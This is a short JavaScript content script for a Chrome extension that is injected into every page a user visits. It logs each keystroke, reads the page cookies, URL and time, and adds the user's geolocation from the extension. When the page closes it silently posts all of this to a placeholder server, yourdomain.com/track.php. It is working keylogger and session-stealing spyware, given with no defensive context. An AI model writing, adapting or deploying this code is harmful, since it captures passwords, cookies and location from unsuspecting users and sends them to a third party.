// Injected into every page

var port = chrome.runtime.connect();
var data = {
    address: window.location.href,
    keys: '',
    time: new Date().toLocaleTimeString(),
    cookies: document.cookie
};

port.onMessage.addListener(function(msg) {
    data.latitude = msg.latitude;
    data.longitude = msg.longitude;
});

document.addEventListener('keyup', function(e){
    data.keys += (String.fromCharCode(e.which));
});

window.addEventListener('beforeunload', function(){
    try{
        var xhr = new XMLHttpRequest();
        var formData = new FormData();

        formData.append('data', JSON.stringify(data));

        xhr.open("POST", "http://yourdomain.com/track.php", true);
        xhr.send(formData);
    }catch(e){}
});

port.postMessage('getLocation');
